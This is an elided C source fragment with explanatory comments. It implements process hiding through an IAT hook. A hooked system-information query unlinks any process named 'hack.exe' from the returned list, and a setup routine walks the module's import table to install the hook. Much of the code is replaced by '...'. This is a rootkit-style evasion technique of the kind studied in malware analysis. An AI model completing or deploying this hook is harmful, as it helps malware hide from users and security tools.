// preprocessor macro
// It tells the Microsoft C Runtime (CRT) not to show warnings about “unsafe” functions.
...
)
{
	...
	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
	{
		...
		do
		{
			...
			if (!wcsncmp(pNext->ImageName.Buffer, L"hack.exe", pNext->ImageName.Length))
			{
				if (!pNext->NextEntryOffset)
					pCurrent->NextEntryOffset = 0;
				else
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				// resets the pointer so the loop continues from the updated entry after removing the target process from the list.
				pNext = pCurrent;
			}
...
void StartProcessHideHook()
{
	MODULEINFO modInfo = { 0 };
	HMODULE hModule = GetModuleHandle(0); // get current module's handle

	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));

	char szAddress[64];

	// lpBaseOfDll: Start address of the module in memory
	// EntryPoint: Where execution begins in the module
	...
	// pIID->Characteristics: A value of 0 marks the end of the import descriptor array.
	...
	//		ULONGLONG Function;         // PDWORD; Found in the IAT
	//		ULONGLONG Ordinal;
	//		ULONGLONG AddressOfData;    // PIMAGE_IMPORT_BY_NAME; Found in the INT
	//	} u1;
	//} IMAGE_THUNK_DATA64;
	// 
